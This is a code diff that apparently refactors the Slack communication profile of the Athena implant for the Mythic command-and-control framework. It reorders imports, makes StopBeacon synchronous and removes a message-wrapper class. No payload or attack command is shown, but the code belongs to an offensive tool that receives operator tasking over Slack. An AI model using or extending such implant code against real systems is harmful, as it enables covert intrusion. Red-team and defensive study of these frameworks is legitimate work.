@@ -1,29 +1,24 @@
-﻿using Athena.Utilities;
-using System;
-using System.Net;
-using System.Net.Security;
-using System.Threading.Tasks;
-using System.Collections.Generic;
-using System.Collections.Specialized;
-using System.Linq;
-using System.Xml.Linq;
-using Athena.Models.Config;
-using Slack.NetStandard.Auth;
-using Slack.NetStandard;
-using Slack.NetStandard.WebApi.Chat;
-using Slack.NetStandard.Messages;
-using Slack.NetStandard.WebApi.Files;
-using Slack.NetStandard.Messages.Blocks;
-using Slack.NetStandard.WebApi.Conversations;
-using System.Text.Json;
-using System.Text.Json.Serialization;
-using System.Net.Http.Headers;
-using System.Diagnostics;
+﻿using Athena.Commands;
 using Athena.Models.Athena.Commands;
+using Athena.Models.Config;
 using Athena.Models.Mythic.Checkin;
 using Athena.Models.Mythic.Response;
 using Athena.Models.Mythic.Tasks;
-using Athena.Commands;
+using Athena.Profiles.Slack;
+using Athena.Utilities;
+
+using System.Diagnostics;
+using System.Net;
+using System.Net.Http.Headers;
+using System.Net.Security;
+using System.Text.Json;
+
+using Slack.NetStandard;
+using Slack.NetStandard.Messages;
+using Slack.NetStandard.Messages.Blocks;
+using Slack.NetStandard.WebApi.Chat;
+using Slack.NetStandard.WebApi.Conversations;
+using Slack.NetStandard.WebApi.Files;
 
 namespace Athena
 {
@@ -391,7 +386,7 @@ namespace Athena
                 }
             }
         }
-        public async Task<bool> StopBeacon()
+        public bool StopBeacon()
         {
             this.cts.Cancel();
             return true;
@@ -416,18 +411,5 @@ namespace Athena
                 status = "failed"
             };
         }
-    }
-
-    public class MythicMessageWrapper
-    {
-        public string message { get; set; } = String.Empty;
-        public string sender_id { get; set; } //Who sent the message
-        public bool to_server { get; set; }
-        public int id { get; set; }
-        public bool final { get; set; }
-    }
-    [JsonSerializable(typeof(MythicMessageWrapper))]
-    public partial class MythicMessageWrapperJsonContext : JsonSerializerContext
-    {
     }
 }
